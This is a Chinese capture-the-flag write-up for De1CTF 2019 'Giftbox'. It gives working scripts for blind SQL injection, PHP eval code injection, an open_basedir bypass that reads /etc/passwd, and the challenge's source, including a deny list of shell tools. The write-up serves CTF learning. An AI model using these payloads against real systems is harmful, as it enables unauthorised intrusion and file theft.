# \[De1CTF 2019]Giftbox

## \[De1CTF 2019]Giftbox

## 考点

* 无参rce
* chr拼接命令执行
* open\_basedir绕过

## wp

给了个shell的界面，usage.md如下

```
[De1ta Nuclear Missile Controlling System]

login [username] [password]
logout
launch
targeting [code] [position]
destruct

Besides, there are some hidden commands, try to find them!
```

无论执行什么命令都要先login

执行命令的时候抓包，看到了请求的地址`shell.php?a=login admin admin&totp=19541572`，提示用户密码错误

![](<../.gitbook/assets/image (4) (1).png>)

使用其他用户登录，提示用户名不存在

![](<../.gitbook/assets/image (17).png>)

应该是有注入，尝试一下发现存在布尔盲注

![](<../.gitbook/assets/image (22) (1) (1).png>)

重放提示totp时间戳错误

![](<../.gitbook/assets/image (34).png>)

F12看一下有没有泄露信息，发现两个js文件，main.js和totp.main.js

在main.js中发现提示，下载下来是pyotp的源码，版本是2.2.7，`pip install pyotp==2.2.7`安装一下

```
/*
[Developer Notes]
OTP Library for Python located in js/pyotp.zip
Server Params:
digits = 8
interval = 5
window = 1
*/
```

同样也给了key `GAXG24JTMZXGKZBU` 以及其他命令

![](<../.gitbook/assets/image (23).png>)

其他可用命令

```
help exit hi hey hello clear ls cat cd
```

先看注入，盲注脚本如下

```python
import requests
import pyotp
import time
def get_database():
    flag = ''
    totp = pyotp.TOTP("GAXG24JTMZXGKZBU", digits=8, interval=5)
    s = requests.session()
    
    for i in range(1, 50):
        print(flag)
        low = 32
        high = 126
        mid = (low+high)//2
        while low < high:
            time.sleep(0.1)
            #payload = f"login aaa'or/**/1=(ascii(substr((select(database())),{i},1))>{mid})%23 admin"
            #payload = f"login aaa'or/**/1=(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{i},1))>{mid})%23 admin"
            #payload = f"login aaa'or/**/1=(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='users')),{i},1))>{mid})%23 admin"
            payload = f"login aaa'or/**/1=(ascii(substr(((select(group_concat(password))from(users))),{i},1))>{mid})%23 admin"
            
            r = s.get(url=f'http://ab675a9c-3542-4906-9c18-39f0517d9631.node4.buuoj.cn:81/shell.php?a={payload}&totp={totp.now()}')

            if 'password incorrect' in r.text:
                low = mid + 1
            if 'user not found' in r.text:
                high = mid
            mid = (low+high)//2
            if low == high:
                flag = flag + chr(low)
                break
            if low > high:
                print("error")
get_database()
```

database是giftbox，表是users，字段是id,username,password，得到hint{G1ve\_u\_hi33en\_C0mm3nd-sh0w\_hiiintttt\_23333}

然后执行sh0w\_hiiintttt\_23333

得到提示

```
{"code":0,"message":"we add an evil monster named 'eval' when launching missiles."}
```

然后`login admin hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}`成功登录

写个脚本，不用浏览器了

```python
import requests
import pyotp


totp = pyotp.TOTP("GAXG24JTMZXGKZBU", digits=8, interval=5)
s = requests.session()
f = open('ress.txt','a')
while True:
    cmd = input('command: ')
    if cmd.startswith('login'):
        cmd = cmd
    
    r = s.get(url=f'http://ab675a9c-3542-4906-9c18-39f0517d9631.node4.buuoj.cn:81/shell.php?a={cmd}&totp={totp.now()}')
    
    print(r.text)
    f.write(r.text)
    f.write('\n')
f.close()
```

![](<../.gitbook/assets/image (11) (1).png>)

提示`Setting target: $1 = "1";`，基本可以确定后端是`eval("$1='2';")`这样

输入如下内容，可以得到phpinfo

```
destruct
targeting a phpinfo
targeting b {$a()}
launch
```

![](<../.gitbook/assets/image (33) (1).png>)

重新写个脚本

```python
import requests
import pyotp
totp = pyotp.TOTP("GAXG24JTMZXGKZBU", digits=8, interval=5)
s = requests.session()
f = open('ress.txt','a')
while True:
    getcmd = input('command: ')
    if getcmd == 'login':
        cmd = 'login admin hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}'
        r = s.get(url=f'http://ab675a9c-3542-4906-9c18-39f0517d9631.node4.buuoj.cn:81/shell.php?a={cmd}&totp={totp.now()}')
        print(r.text)
        f.write(r.text)
        f.write('\n')
    elif getcmd == 'send':
        ff = open('shell.txt','r')
        for line in ff:
            cmd = line.strip()
            r = s.get(url=f'http://ab675a9c-3542-4906-9c18-39f0517d9631.node4.buuoj.cn:81/shell.php?a={cmd}&totp={totp.now()}')
            print(r.text)
            f.write(r.text)
            f.write('\n')
        ff.close()
f.close()
```

shell.txt内容如下，读取shell.php

```
destruct
targeting a readfile
targeting b shell.php
targeting c {$a($b)}
launch
```

{% code title="shell.php" %}
```php
<?php
ini_set('display_errors',0);
error_reporting(0);
session_set_cookie_params(1800);
session_start();
header("Content-Type: application/json");
header('Access-Control-Allow-Origin: *');
include 'totp.php';
@$act=$_GET['a'];
@$totp=$_GET['totp'];
$sandbox='/sandbox/';
$otop_key='GAXG24JTMZXGKZBU';
if (isset($act)) {
	$act=(string)$act;
} else {
	$act='';
}
if (isset($totp)) {
	$totp=(string)$totp;
} else {
	$totp='';
}
if (!Google2FA::verify_key($otop_key, $totp)) {
	$res=array("code"=>404,"message"=>"totp err, server timestamp:".microtime(true));
	die(json_encode($res));
}
switch($act) {
	case 'ls':
	        $handler = opendir($sandbox);
	if ($handler) {
		while (($filename = readdir($handler)) !== false) {
			if ($filename != "." && $filename != "..") {
				$files[] = $filename;
			}
		}
		closedir($handler);
		$res=array("code"=>0,"data"=>$files);
	} else {
		$res=array("code"=>404,"message"=>"Access Denied");
	}
	break;
	case 'cat':
	        $file_name = $_POST['filename'];
	$file_name = (string) $file_name;
	$tmp_name = str_replace('\\','',$file_name);
	$tmp_name = str_replace('/','',$tmp_name);
	if ($_POST['filename']==='/flag') {
		$res=array("code"=>404,"message"=>"<img src='img/flag.jpg' width='33%' height='33%'>");
		break;
	} else if (stripos($tmp_name,'..')===FALSE&&stripos($tmp_name,'secret')===FALSE) {
		if (file_exists($sandbox.$file_name)) {
			$data=htmlspecialchars(file_get_contents($sandbox.$tmp_name));
			if ($data) {
				$res=array("code"=>0,"data"=>$data);
			} else {
				$res=array("code"=>404,"message"=>"cat: ".$file_name.": No such file or directory");
			}
			break;
		}
	}
	$res=array("code"=>404,"message"=>"cat: ".$file_name.": No such file or directory");
	break;
	case 'cd':
	        $res=array("code"=>404,"message"=>"something broken~");
	break;
	case 'list':
	        $res=array("code"=>404,"data"=>NULL);
	break;
	case 'launch':
	        if (isset($_SESSION['login'])) {
		include($sandbox.'modules/launch.php');
		$res=array("code"=>0,"message"=>$res);
	} else {
		$res=array("code"=>404,"message"=>'login first.');
	}
	break;
	case 'destruct':
	        if (isset($_SESSION['login'])) {
		include($sandbox.'modules/destruct.php');
		$res=array("code"=>0,"message"=>"missiles destructed.");
	} else {
		$res=array("code"=>404,"message"=>'login first.');
	}
	break;
	case 'logout':
	        session_destroy();
	$res=array("code"=>0,"message"=>"logout.");
	break;
	case 'flag':
	        $res=array("code"=>0,"message"=>"<img src='img/flag.jpg' width='33%' height='33%'>");
	break;
	case 'getflag':
	        $res=array("code"=>0,"message"=>"flag{congratulations!}");
	break;
	case 'sh0w_hiiintttt_23333':
	        $res=array("code"=>0,"message"=>"we add an evil monster named 'eval' when launching missiles.");
	break;
	case 'usage':
	        $res=array("code"=>0,"message"=>"use `cat usage.md` instead.");
	break;
	case 'uname':
	        $res=array("code"=>0,"message"=>"Darwin<br>");
	break;
	case 'uname -a':
	        $res=array("code"=>0,"message"=>"Darwin de1ta-mbp 17.7.0 Darwin Kernel Version 17.7.0; root:xnu-4570.71.22~1/RELEASE_X86_64 x86_64<br>");
	break;
	case 'uname -r':
	        $res=array("code"=>0,"message"=>"17.7.0<br>");
	break;
	case 'hostname':
	        $res=array("code"=>0,"message"=>"de1ta-mbp<br>");
	break;
	default:
	        $coms=explode(' ', $act);
	switch ($coms[0]) {
		case 'login':
		                $username=$coms[1];
		$password=$coms[2];
		if (strlen($username)>100 || strlen($password)>100) {
			$res=array("code"=>404,"message"=>'username or password too long<br>');
		}
		if (strlen($username)>0 && strlen($password)>0) {
			include($sandbox.'modules/login.php');
			$res=array("code"=>0,"message"=>$res);
		} else {
			$res=array("code"=>404,"message"=>'usage: login [username] [password]<br>');
		}
		break;
		case 'targeting':
		                if (isset($_SESSION['login'])) {
			$code=$coms[1];
			$position=$coms[2];
			if (strlen($coms[1])>0 || strlen($coms[2])>0) {
				include($sandbox.'modules/targeting.php');
				$res=array("code"=>0,"message"=>$res);
			} else {
				$res=array("code"=>404,"message"=>'usage: targeting [code] [position]<br>');
			}
		} else {
			$res=array("code"=>404,"message"=>'login first.');
		}
		break;
		case 'echo':
		                $str=$coms[1];
		$res=array("code"=>0,"message"=>$str."<br>");
		break;
		case 'export':
		                $res=array("code"=>0,"message"=>$act."<br>");
		break;
		case 'ping':
		            case 'curl':
		            case 'wget':
		                $res=array("code"=>0,"message"=>$coms[0].": Network is unreachable.<br>");
		break;
		case 'ip':
		            case 'ifconfig':
		                $res=array("code"=>0,"message"=>$coms[0].": No network adapters.<br>");
		break;
		case 'python':
		            case 'python2':
		            case 'python3':
		            case 'pip':
		            case 'pip2':
		            case 'pip3':
		            case 'php':
		            case 'php5':
		            case 'php7':
		            case 'nodejs':
		            case 'node':
		            case 'npm':
		            case 'perl':
		            case 'gcc':
		            case 'g++':
		            case 'bash':
		            case 'sh':
		            case 'go':
		            case 'gem':
		            case 'ruby':
		            case 'java':
		            case 'javac':
		            case '':
		                $res=array("code"=>0,"message"=>$coms[0].": DISABLED BY DE1TA TEAM.<br>");
		break;
		default:
		                break;
	}
	if (isset($res)) break;
	$res=array("code"=>404,"message"=>"zsh: command not found: ".$act."<br>");
	break;
}
die(json_encode($res));
?>
```
{% endcode %}

* 通过`chr(ord(strrev(crypt(serialize(array())))))`获取`/`
* 通过`chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))`获取`.`

不能使用end等操作数组的函数，只能用chr拼接，并且设置了open\_basedir，需要绕过

![](<../.gitbook/assets/image (12).png>)

绕过脚本，这里的chdir数量由chdir一次能否进入根目录决定，这里的目录是`/app/`，所以一次就行

```php
<?php
mkdir('tmpdir');
chdir('tmpdir');
ini_set('open_basedir','..');
chdir('..');
ini_set('open_basedir','/');
$a=file_get_contents('/etc/passwd');
var_dump($a);
?>
```

直接放exp吧

```python
import requests
import urllib
import string
import pyotp

url = 'http://ab675a9c-3542-4906-9c18-39f0517d9631.node4.buuoj.cn:81/shell.php?a=%s&totp=%s'
totp = pyotp.TOTP("GAXG24JTMZXGKZBU", digits=8, interval=5)
s = requests.session()

def login(password):
    username = 'admin'
    payload = 'login %s %s' % (username, password)
    payload = urllib.parse.quote(payload)
    payload = url % (payload, totp.now())
    s.get(payload)

def destruct():
    payload = 'destruct'
    payload = urllib.parse.quote(payload)
    payload = url % (payload, totp.now())
    s.get(payload)

def targeting(code, position):
    payload = 'targeting %s %s' % (code, position)
    payload = urllib.parse.quote(payload)
    payload = url % (payload, totp.now())
    s.get(payload)

def launch():
    payload = 'launch'
    payload = urllib.parse.quote(payload)
    payload = url % (payload, totp.now())
    return s.get(payload).text

login('hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}')
destruct()
targeting('a','chr')
targeting('b','{$a(46)}')
targeting('c','{$b}{$b}')
targeting('d','{$a(47)}')
targeting('e','js')
targeting('f','open_basedir')
targeting('g','chdir')
targeting('h','ini_set')
targeting('i','file_get_')
targeting('j','{$i}contents')
targeting('k','{$g($e)}')
targeting('l','{$h($f,$c)}')
targeting('m','{$g($c)}')
targeting('n','{$h($f,$d)}')
targeting('o','{$d}flag')
targeting('p','{$j($o)}')
targeting('q','printf')
targeting('r','{$q($p)}')
print(launch())
```

相当于执行如下语句

```php
chdir('js');
ini_set('open_basedir','..');
chdir('..');
ini_set('open_basedir','/');
printf(file_get_contents('/flag'));
```
